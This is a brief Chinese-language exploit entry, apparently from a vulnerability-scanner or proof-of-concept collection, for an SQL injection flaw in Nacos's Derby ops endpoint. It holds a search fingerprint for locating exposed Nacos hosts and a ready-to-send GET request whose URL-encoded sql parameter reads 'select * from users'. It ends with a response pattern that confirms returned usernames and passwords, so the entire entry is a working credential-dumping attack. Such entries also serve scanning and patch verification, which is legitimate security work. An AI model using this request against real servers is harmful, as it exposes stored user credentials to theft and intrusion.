# NacosDerbySQL注入漏洞

Nacos ｜ SQL注入 ｜ —
- **指纹**：`app="nacos"`
- **请求**：`GET /nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73 HTTP/1.1`
- **响应特征**：200 ^(?=.*?USERNAME)(?=.*?PASSWORD).*?$